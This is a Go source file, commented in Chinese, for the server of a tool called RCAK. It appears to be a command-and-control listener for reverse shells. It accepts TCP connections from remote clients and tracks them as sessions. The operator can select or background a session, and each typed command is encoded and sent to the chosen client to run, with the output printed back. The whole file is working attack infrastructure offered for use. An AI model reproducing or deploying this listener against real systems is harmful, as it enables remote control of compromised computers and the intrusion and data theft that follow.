package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"

	"rcak/pkg/util"
)

// 终端显示颜色
const (
	WHITE   = "\x1b[37;1m"
	RED     = "\x1b[31;1m"
	GREEN   = "\x1b[32;1m"
	YELLOW  = "\x1b[33;1m"
	BLUE    = "\x1b[34;1m"
	MAGENTA = "\x1b[35;1m"
	CYAN    = "\x1b[36;1m"
)

var (
	help     bool   // 查看帮助
	host     string // 监听主机IP
	port     string // 监听端口
	clientid int    // 客户端id

	// clientip   string                                    // 客户端ip
	counts     int                                       // 会话计数
	lock                        = &sync.Mutex{}          // 锁
	clientList map[int]net.Conn = make(map[int]net.Conn) // 存储所有客户端连接的会话
	clientInfo map[int]string   = make(map[int]string)   // 存储所有客户端信息
)

// init函数是用于程序执行前做包的初始化的函数
func init() {
	flag.BoolVar(&help, "h", false, "help usage")
	flag.StringVar(&host, "H", "0.0.0.0", "host ip default 0.0.0.0")
	flag.StringVar(&port, "p", "20221", "port default 20221")
}

// 帮助用法函数
func usage() {
	fmt.Fprintf(os.Stderr,
		`RCAK version: 0.0.1
Usage: rcaks [-h] -H <host_ip> -p <port> 
Options:
`)
	// PrintDefault会向标准错误输出写入所有注册好的flag的默认值
	flag.PrintDefaults()
}

// 加载用户输入的参数
func loadParam() error {
	// 解析参数
	flag.Parse()

	if help {
		// 帮助用法
		usage()
		// 程序正常退出，返回0
		os.Exit(0)
	}
	return nil
}

// 打印终端
func printshell() {
	if _, ok := clientInfo[clientid]; ok {
		fmt.Print(YELLOW, "ID:", clientid, "	IP:", clientInfo[clientid], ">")
	} else {
		fmt.Print(BLUE, "RCAK", ">")
	}
}

// 处理客户端消息
func handleMessage(conn net.Conn) {
	// 客户端ID
	var cid int
	// 延迟关闭
	defer conn.Close()
	// 连接信息里获取ip
	clientip := conn.RemoteAddr().String()

	// 加锁，避免冲突
	lock.Lock()
	counts++
	cid = counts
	clientList[cid] = conn
	clientInfo[cid] = clientip
	// 解锁
	lock.Unlock()

	// 打印连接信息
	fmt.Printf("\n--- client: %s connection ---\n", clientip)
	// 继续显示终端
	printshell()

	//
	for {
		message, err := bufio.NewReader(conn).ReadString('\n')
		// 如果客户端断开，删除客户端信息
		if err == io.EOF {
			conn.Close()
			delete(clientList, cid)
			delete(clientInfo, cid)
			break
		}
		contents, err := util.Decode(message)
		if err != nil {
			log.Fatal(err)
		}

		switch contents {
		// TODO 额外功能
		case "TODO":
		// 接收消息
		default:
			// 去除最后一个换行符
			messages := strings.TrimRight(contents, "\n")
			fmt.Println(messages)
			printshell()
		}
	}

	// 客户端断开连接
	fmt.Printf("\n--- %s close---\n", clientip)
	printshell()
}

// 等待Socket客户端连接
func handleConnWait() {
	addr := fmt.Sprintf("%s:%s", host, port)
	l, err := net.Listen("tcp", addr)
	if err != nil {
		// 监听失败，返回错误
		log.Fatal(err)
	}
	// 延迟关闭连接
	defer l.Close()
	for {
		// 处理客户端连接
		conn, err := l.Accept()
		if err != nil {
			log.Fatal(err)
		}
		// 处理客户端消息
		go handleMessage(conn)

	}
}

// ReadLine 函数等待命令行输入,返回字符串
func ReadLine() string {
	buf := bufio.NewReader(os.Stdin)
	lin, _, err := buf.ReadLine()
	if err != nil {
		fmt.Println(RED, "[!] Error to Read Line!")
	}
	return string(lin)
}

func main() {
	// 读取用户输入的参数
	loadParam()

	// 协程开启监听
	go handleConnWait()

	// 是否连接了客户端
	var (
		ok   bool = false
		conn net.Conn
	)

	// 终端
	for {
		// 正常打印终端
		if !ok {
			printshell()
		}
		command := ReadLine()
		conn, ok = clientList[clientid]
		switch command {
		// 如果输入为空，则什么都不做
		case "":
			// 连接了客户端 才会打印 和上面的避免重复打印
			if ok {
				printshell()
			}
		case "help":
			fmt.Println("")
			fmt.Println(CYAN, "命令                 功能")
			fmt.Println(CYAN, "-------------------------------------------------------")
			fmt.Println(CYAN, "session             选择在线的客户端")
			fmt.Println(CYAN, "b                   (background)返回,挂起客户端在后台")
			fmt.Println(CYAN, "exit                客户端下线")
			fmt.Println(CYAN, "quit                退出服务器端")
			fmt.Println(CYAN, "-------------------------------------------------------")
			fmt.Println("")
			// 为了美观
			if ok {
				printshell()
			}
		case "session":
			if len(clientInfo) > 0 {
				for k, v := range clientInfo {
					fmt.Println(CYAN, "--------------------------------------")
					fmt.Printf("[客户端ID:%d|IP信息:%s]\n", k, v)
				}
				fmt.Print("选择客户端ID: ")
				inputid := ReadLine()

				if inputid != "" {
					var err error
					// 转换int类型
					clientid, err = strconv.Atoi(inputid)
					if err != nil {
						fmt.Println("请输入数字")
					} else if _, ok = clientList[clientid]; ok {
						// 如果输入并且存在客户端id，获取客户端操作系统
						cmd := util.Encode("getos")
						clientList[clientid].Write([]byte(cmd + "\n"))
					}
				}
			} else {
				fmt.Println(CYAN, "没有在线客户端")
			}
		// 后台运行
		case "b":
			clientid = 0
			printshell()
		case "exit":
			if ok {
				s := util.Encode("exit")
				conn.Write([]byte(s + "\n"))
			}
		case "quit":
			os.Exit(0)
		default:
			// 连接上客户端才会执行
			if ok {
				s := util.Encode(command)
				conn.Write([]byte(s + "\n"))
			}
		}
	}
}
